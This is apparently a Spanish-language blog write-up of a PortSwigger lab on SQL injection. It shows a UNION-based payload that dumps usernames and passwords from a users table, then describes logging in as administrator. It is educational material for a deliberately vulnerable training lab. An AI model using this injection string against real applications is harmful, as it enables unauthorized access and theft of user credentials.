---
title: "05 SQL injection UNION attack, retrieving data from other tables"
collection: publications
category: portswigger
permalink: /publications/05_SQL injection UNION attack, retrieving data from other tables
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría de producto. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en UNION que recupera los nombres de usuario y las contraseñas de los usuarios de la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection UNION attack, retrieving data from other tables'
---

![logo]({{site.url}}/images/SQLi/sqli-5/logo.png)

Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables>  
Dificultad: PRACTITIONER

## Descripción del laboratorio

![lab_description]({{site.url}}/images/SQLi/sqli-5/lab_description.png)

## Query

La consulta utilizada en el laboratorio tendrá un aspecto similar a

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

## Pasos

### Confirmar argumento inyectable

Los primeros pasos son idénticos a los de los laboratorios [SQL injection UNION attack, determining the number of columns returned by the query](https://sacrabma92.github.io/Blog//publications/03_SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query) y [SQL injection UNION attack, finding a column containing text](https://sacrabma92.github.io/Blog//publications/04_SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text) y no se repiten aquí.

Como resultado de estos pasos, descubro que el número de columnas es 2, siendo ambas columnas de cadena.

### Extracción de nombres de usuario y contraseñas

Sé qué tabla (`users`) contiene las credenciales (columnas `username` y `password`). Y convenientemente tenemos dos columnas de cadena, por lo que podemos simplemente volcar el contenido con un UNION.

Utilizo una categoría inválida para que no se encuentre ningún artículo y sólo aparezca mi salida. La cadena de inyección es `X' UNION (SELECT username, password FROM users)--` para formar la siguiente consulta:

```sql
SELECT * FROM someTable WHERE category = 'X' UNION (SELECT username, password FROM users)--
```

El resultado es un volcado de tres credenciales de usuario:

![credentials]({{site.url}}/images/SQLi/sqli-5/credentials.png)

El último paso es iniciar sesión como administrador y el laboratorio se actualiza a

![success]({{site.url}}/images/SQLi/sqli-5/success.png)
